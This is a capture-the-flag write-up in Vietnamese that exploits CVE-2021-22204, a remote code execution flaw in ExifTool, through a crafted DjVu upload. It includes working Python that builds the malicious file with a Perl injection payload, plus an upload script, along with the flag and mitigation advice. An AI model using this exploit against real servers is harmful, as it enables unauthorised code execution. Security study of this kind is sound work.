# Shell

## Thông tin challenge

- **URL:** http://chall.0xfun.org:52755/
- **Mô tả:** Web app cho phép upload ảnh để xem EXIF metadata. Flag nằm trong file `flag.txt` trên server.
- **Gợi ý:** Chỉ cho phép upload ảnh, không cần brute force.

## Phân tích

### Bước 1: Khám phá ứng dụng

Truy cập trang web, ta thấy một form upload file đơn giản:

```html
<form method="post" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="submit" value="Upload">
</form>
```

Khi upload một ảnh JPEG bình thường, server trả về metadata EXIF:

```
ExifTool Version Number         : 12.16
File Name                       : test.jpg
Directory                       : static/uploads
...
```

### Bước 2: Xác định lỗ hổng

Từ output ta thấy server đang sử dụng **ExifTool version 12.16**.

Phiên bản này bị ảnh hưởng bởi **CVE-2021-22204** - một lỗ hổng **Remote Code Execution (RCE)** nghiêm trọng trong ExifTool < 12.24.

### Bước 3: Hiểu về CVE-2021-22204

Lỗ hổng nằm trong cách ExifTool xử lý file **DjVu**. Cụ thể:

1. ExifTool sử dụng Perl để parse metadata
2. Trong chunk `ANTa` (annotation) của file DjVu, có thể chứa chuỗi đặc biệt
3. Ký tự `\c` trong Perl được interpret như một escape sequence đặc biệt
4. Khi kết hợp với `${}`, ta có thể inject và thực thi code Perl tùy ý

**Payload format:**
```
(metadata "\c${system('COMMAND')}")
```

## Exploit

### Tạo file DjVu độc hại

```python
import subprocess
import tempfile
import os

def create_djvu_with_payload(command):
    """Tạo file DjVu exploit CVE-2021-22204"""
    
    # Payload injection - \c trigger perl code evaluation
    payload = f'(metadata "\\c${{system(\'{command}\')}}")'
    
    with tempfile.TemporaryDirectory() as tmpdir:
        payload_file = os.path.join(tmpdir, "payload.txt")
        bzz_file = os.path.join(tmpdir, "payload.bzz")
        djvu_file = os.path.join(tmpdir, "exploit.djvu")
        
        # Ghi payload vào file
        with open(payload_file, "w") as f:
            f.write(payload)
        
        # Nén với bzz (DjVu compression)
        subprocess.run(["bzz", payload_file, bzz_file], capture_output=True)
        
        # Tạo file DjVu với annotation chứa payload
        subprocess.run(
            ["djvumake", djvu_file, "INFO=100,100,100", f"ANTz={bzz_file}"],
            capture_output=True
        )
        
        with open(djvu_file, "rb") as f:
            return f.read()
```

### Upload và lấy flag

```python
import requests

TARGET_URL = "http://chall.0xfun.org:52755/"

# Tạo exploit với command đọc flag
djvu_content = create_djvu_with_payload("cat /flag.txt")

# Upload file
files = {'file': ('exploit.djvu', djvu_content, 'image/vnd.djvu')}
response = requests.post(TARGET_URL, files=files)

print(response.text)
```

### Kết quả

```
0xfun{h1dd3n_p4yl04d_1n_pl41n_51gh7}ExifTool Version Number : 12.16
...
```

## Flag

```
0xfun{h1dd3n_p4yl04d_1n_pl41n_51gh7}
```

## Tóm tắt kỹ thuật

| Thông tin | Chi tiết |
|-----------|----------|
| Lỗ hổng | CVE-2021-22204 |
| Loại | Remote Code Execution (RCE) |
| Phần mềm bị ảnh hưởng | ExifTool < 12.24 |
| Vector tấn công | Malicious DjVu file với ANTa/ANTz chunk |
| Payload | `(metadata "\c${system('command')}")` |

## Cách phòng chống

1. **Cập nhật ExifTool** lên phiên bản >= 12.24
2. **Validate file type** bằng magic bytes, không chỉ dựa vào extension
3. **Sandbox** quá trình xử lý file upload
4. **Tắt tính năng xử lý DjVu** nếu không cần thiết

## Tools cần thiết

```bash
# Cài đặt djvulibre để tạo file DjVu
sudo apt-get install djvulibre-bin

# Tools sử dụng:
# - bzz: nén dữ liệu theo format DjVu
# - djvumake: tạo file DjVu từ các chunk
```

## References

- [CVE-2021-22204 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-22204)
- [ExifTool CVE-2021-22204 - Exploit Analysis](https://blog.convisoappsec.com/en/a-]]case-study-on-cve-2021-22204-exiftool-rce/)
- [DjVu File Format Specification](http://djvu.sourceforge.net/specs.html)
